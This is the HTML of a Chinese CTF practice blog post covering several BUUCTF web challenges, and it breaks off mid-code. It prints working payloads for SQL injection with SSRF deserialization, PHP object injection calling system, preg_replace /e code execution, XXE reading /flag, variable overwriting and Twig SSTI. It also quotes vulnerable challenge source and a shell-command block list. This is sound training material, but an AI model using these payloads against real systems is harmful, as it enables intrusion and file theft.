@@ -1,0 +1,885 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Zer0peach">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="[网鼎杯 2018]Fakebook注册个用户后，点开发现url，no&#x3D;1，’尝试报错，成功报错，于是SQL注入 本来想着读username、passwd去登陆，但没什么用，读data发现反序列化数据 。。。然后就不会了 看WP，robots.txt有提示，下载源码，虽然有isValidBlog，但其实没什么用 直接序列化ssrf的数据 然后union all select 1,2,3,4，放入第">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Buu刷题">
+<meta property="og:url" content="https://zer0peach.github.io/2023/09/08/Buu%E5%88%B7%E9%A2%98/index.html">
+<meta property="og:site_name" content="Zer0peach can&#39;t think">
+<meta property="og:description" content="[网鼎杯 2018]Fakebook注册个用户后，点开发现url，no&#x3D;1，’尝试报错，成功报错，于是SQL注入 本来想着读username、passwd去登陆，但没什么用，读data发现反序列化数据 。。。然后就不会了 看WP，robots.txt有提示，下载源码，虽然有isValidBlog，但其实没什么用 直接序列化ssrf的数据 然后union all select 1,2,3,4，放入第">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zer0peach.github.io/2023/09/08/Buu%E5%88%B7%E9%A2%98/image-20230908114051163.png">
+<meta property="article:published_time" content="2023-09-08T02:26:59.000Z">
+<meta property="article:modified_time" content="2023-09-17T03:37:02.632Z">
+<meta property="article:author" content="Zer0peach">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://zer0peach.github.io/2023/09/08/Buu%E5%88%B7%E9%A2%98/image-20230908114051163.png">
+  
+  
+  
+  <title>Buu刷题 - Zer0peach can&#39;t think</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"zer0peach.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Zer0peach&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Buu刷题"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-09-08 10:26" pubdate>
+          2023年9月8日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          53 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Buu刷题</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><p>注册个用户后，点开发现url，<code>no=1</code>，<code>’</code>尝试报错，成功报错，于是SQL注入</p>
+<p>本来想着读username、passwd去登陆，但没什么用，读data发现反序列化数据</p>
+<p>。。。然后就不会了</p>
+<p>看WP，robots.txt有提示，下载源码，虽然有isValidBlog，但其实没什么用</p>
+<p>直接序列化ssrf的数据</p>
+<p>然后union all select 1,2,3,4，放入第四个位置（对应blog，能够反序列化的地方）</p>
+<div class="code-wrapper"><pre><code class="hljs ada">?no=-<span class="hljs-number">1</span> union <span class="hljs-keyword">all</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-symbol">&#x27;O</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;UserInfo&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">1</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;s:<span class="hljs-number">29</span>:<span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;&#x27;</code></pre></div>
+
+<h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><p>放入burp中，等一会就会截取到</p>
+<p>发现两个参数，修改func，会发现回调函数报错，尝试system,报错hacker</p>
+<div class="code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">func</span>=readfile&amp;p=index。php</code></pre></div>
+
+<p>读取index.php，发现禁用的函数名，并且有</p>
+<div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;
+     <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;Y-m-d h:i:s a&quot;</span>;
+     <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;date&quot;</span>;
+     <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;
+         <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;func != <span class="hljs-string">&quot;&quot;</span>) &#123;
+             <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$this</span>-&gt;func, <span class="hljs-variable">$this</span>-&gt;p);
+         &#125;
+     &#125;
+ &#125;
+ <span class="hljs-variable">$func</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;func&quot;</span>];
+ <span class="hljs-variable">$p</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;p&quot;</span>];
+
+ <span class="hljs-keyword">if</span> (<span class="hljs-variable">$func</span> != <span class="hljs-literal">null</span>) &#123;
+     <span class="hljs-variable">$func</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$func</span>);
+     <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$func</span>,<span class="hljs-variable">$disable_fun</span>)) &#123;
+         <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>);
+     &#125;<span class="hljs-keyword">else</span> &#123;
+         <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Hacker...&quot;</span>);
+     &#125;
+ &#125;
+ <span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<p>然后不会了，。。。。。</p>
+<p>看WP，使用unserialize()，并自行构造发序列化数据</p>
+<div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;
+     <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;ls&quot;</span>;
+     <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;system&quot;</span>;
+     <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;
+         <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;func != <span class="hljs-string">&quot;&quot;</span>) &#123;
+             <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$this</span>-&gt;func, <span class="hljs-variable">$this</span>-&gt;p);
+         &#125;
+ &#125;
+ <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();
+ <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);</code></pre></div>
+
+<p>但找不到flag</p>
+<p>构造<code>find / -name flag</code></p>
+<p>找到flag，然后读取即可</p>
+<h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2><p>点开按钮，查看url，可能存在任意文件读取，尝试index.php，不行，加个php:&#x2F;&#x2F;filter过滤器</p>
+<p>成功读取，关键代码<code>include($_GET[’category‘].&#39;php&#39;)</code></p>
+<p>只有三个文件可利用，于是想到<code>filterchain</code></p>
+<p><img src="/2023/09/08/Buu%E5%88%B7%E9%A2%98/image-20230908114051163.png" srcset="/img/loading.gif" lazyload alt="image-20230908114051163"></p>
+<h2 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2><p>先data:&#x2F;&#x2F;伪协议满足判断，然后读取next.php，回显输入的内容，感觉不对，加个php:&#x2F;&#x2F;filter伪协议，成功读取，</p>
+<div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];
+<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>] = <span class="hljs-variable">$id</span>;
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">complex</span>(<span class="hljs-params"><span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span></span>) </span>&#123;
+    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(
+        <span class="hljs-string">&#x27;/(&#x27;</span> . <span class="hljs-variable">$re</span> . <span class="hljs-string">&#x27;)/ei&#x27;</span>,
+        <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,
+        <span class="hljs-variable">$str</span>
+    );
+&#125;
+<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$re</span> =&gt; <span class="hljs-variable">$str</span>) &#123;
+    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">complex</span>(<span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span>). <span class="hljs-string">&quot;\n&quot;</span>;
+&#125;
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span>(<span class="hljs-params"></span>)</span>&#123;
+	@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);
+&#125;</code></pre></div>
+
+<p>一眼preg_replace的&#x2F;e，存在漏洞，<code>strtolower(&quot;\\1&quot;)</code>的意思自行查找</p>
+<p>要在next.php下加参数</p>
+<div class="code-wrapper"><pre><code class="hljs bash">/next.php?\S*=&#123;<span class="hljs-variable">$&#123;getFlag()&#125;</span>&#125;&amp;cmd=system(<span class="hljs-string">&#x27;cat%20/flag&#x27;</span>);</code></pre></div>
+
+<h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p>一看就要套娃</p>
+<p>进去找不到文件。。。。。</p>
+<p>小看一眼WP，<code>.git</code>泄露</p>
+<p>代码审计一看就是无参数RCE</p>
+<p>列目录</p>
+<div class="code-wrapper"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">var_dump</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">current</span>(<span class="hljs-title">localeconv</span>())));</span></code></pre></div>
+
+<p>flag.php在倒数第二个</p>
+<div class="code-wrapper"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">highlight_file</span>(<span class="hljs-title">next</span>(<span class="hljs-title">array_reverse</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">current</span>(<span class="hljs-title">localeconv</span>())))));</span></code></pre></div>
+
+<h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p>登陆界面抓包，很明显，直接XXE</p>
+<p>尝试直接读取<code>/flag</code>，成功</p>
+<div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span>
+<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">TEST</span> [</span>
+<span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;/flag&quot;</span>&gt;</span>]&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span></code></pre></div>
+
+<h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p>遇到这种题就头大，但是这考的比较简单</p>
+<p>是一个网页，点什么都没用，在最后面发现输出了dog，感觉有点问题，但是找不到文件</p>
+<p>小看一眼wp，又是<code>.git</code>泄露，但好像说不稳定，要多试几次</p>
+<div class="code-wrapper"><pre><code class="hljs awk">&lt;?php
+include <span class="hljs-string">&#x27;flag.php&#x27;</span>;
+<span class="hljs-variable">$yds</span> = <span class="hljs-string">&quot;dog&quot;</span>;
+<span class="hljs-variable">$is</span> = <span class="hljs-string">&quot;cat&quot;</span>;
+<span class="hljs-variable">$handsome</span> = <span class="hljs-string">&#x27;yds&#x27;</span>;
+foreach(<span class="hljs-variable">$_POST</span> as <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;　　　　
+    $<span class="hljs-variable">$x</span> = <span class="hljs-variable">$y</span>  ;  <span class="hljs-regexp">//</span>post 声明至当前文件
+&#125;
+foreach(<span class="hljs-variable">$_GET</span> as <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;　　　 
+    $<span class="hljs-variable">$x</span> = $<span class="hljs-variable">$y</span>;  <span class="hljs-regexp">//</span>GET型变量重新赋值为当前文件变量中以其值为键名的值
+&#125;
+foreach(<span class="hljs-variable">$_GET</span> as <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;
+    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-variable">$x</span> &amp;&amp; <span class="hljs-variable">$x</span> !== <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;　 <span class="hljs-regexp">//</span>传入的变量为flag   value不是flag
+        <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$handsome</span>);
+    &#125;
+&#125;
+<span class="hljs-keyword">if</span>(!isset(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]) &amp;&amp; !isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]))&#123;  
+    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$yds</span>);
+&#125;
+<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>  || <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;   
+    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$is</span>);
+&#125;
+echo <span class="hljs-string">&quot;the flag is: &quot;</span>.<span class="hljs-variable">$flag</span>;
+</code></pre></div>
+
+<p>明显的变量覆盖，想着能不能到最后echo输出，但发现好像不行，只好利用exit</p>
+<p>有三种方法（网上直接抄了）</p>
+<div class="code-wrapper"><pre><code class="hljs routeros">?<span class="hljs-attribute">yds</span>=flag  
+
+?<span class="hljs-attribute">is</span>=flag&amp;flag=flag
+
+?<span class="hljs-attribute">handsome</span>=flag&amp;flag=x&amp;x=flag</code></pre></div>
+
+<h1 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h1><p>hint提示看cookie</p>
+<p>flag.php 输出什么回显什么，猜测ssti</p>
+<p>查看后端是php</p>
+<p>经过尝试后是twig（自己sbb的存的payload忘记怎么用了，看了wp才反应过来）</p>
+<p>然后成功命令执行</p>
+<p>但是发现回显只有一个，就当我困惑时，尝试了<code>cat /etc/passwd</code> 是<code>nginx</code>，而我们的用户是<code>www-data</code> ，所以知道只是输出受限制了</p>
+<p>但我思路仍然受阻，看了眼WP，<code>cat /flag</code> 。。。。。。。。。。。。</p>
+<h1 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h1><p>看url，有img和cmd，cmd禁用很多，从img入手，把编码拿到cyberchef，直接还原（看别人也有解不出来这个的）</p>
+<p>我在编码时也被坑了一下，base64换了一个符号，hex要调为None</p>
+<p>然后自然猜测flag.php(然后跳转，没什么用)，也试过其他后缀，都是跳转同一个地方，大概猜出有个正则匹配</p>
+<p>其实没有东西读的时候，就读index.php，（因为看是图片，我sbb的构造index.png……….）</p>
+<p>然后读出源码</p>
+<div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-title function_ invoke__">error_reporting</span>(E_ALL || ~ E_NOTICE);
+<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);
+<span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];
+<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) 
+    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);
+<span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>])));
+
+<span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file</span>);
+<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$file</span>)) &#123;
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;xixiï½ no flag&quot;</span>);
+&#125; <span class="hljs-keyword">else</span> &#123;
+    <span class="hljs-variable">$txt</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>));
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="hljs-variable">$txt</span> . <span class="hljs-string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;
+&#125;
+<span class="hljs-keyword">echo</span> <span class="hljs-variable">$cmd</span>;
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;
+<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="hljs-variable">$cmd</span>)) &#123;
+    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;forbid ~&quot;</span>);
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;
+&#125; <span class="hljs-keyword">else</span> &#123;
+    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>] !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>])) &#123;
+        <span class="hljs-keyword">echo</span> `<span class="hljs-variable">$cmd</span>`;
+    &#125; <span class="hljs-keyword">else</span> &#123;
+        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;md5 is funny ~&quot;</span>);
+    &#125;
+&#125;
+
+<span class="hljs-meta">?&gt;</span>
+&lt;html&gt;
+&lt;style&gt;
+  body&#123;
+   background:<span class="hljs-title function_ invoke__">url</span>(./bj.png)  no-repeat center center;
+   background-size:cover;
+   background-attachment:fixed;
+   background-color:<span class="hljs-comment">#CCCCCC;</span>
+&#125;
+&lt;/style&gt;
+&lt;body&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre></div>
+
+<h2 id="string-POST-‘a’-string-POST-‘b’-md5-POST-‘a’-md5-POST-‘b’"><a href="#string-POST-‘a’-string-POST-‘b’-md5-POST-‘a’-md5-POST-‘b’" class="headerlink" title="(string)$POST[‘a’] !&#x3D;&#x3D; (string)$POST[‘b’] &amp;&amp; md5($POST[‘a’]) &#x3D;&#x3D;&#x3D; md5($POST[‘b’])"></a>(string)$POST[‘a’] !&#x3D;&#x3D; (string)$POST[‘b’] &amp;&amp; md5($POST[‘a’]) &#x3D;&#x3D;&#x3D; md5($POST[‘b’])</h2><p>猜的八九不离十，关键是</p>
+<div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">else</span> &#123;
+    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>] !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>])) &#123;
+        <span class="hljs-keyword">echo</span> `<span class="hljs-variable">$cmd</span>`;
+    &#125; <span class="hljs-keyword">else</span> &#123;
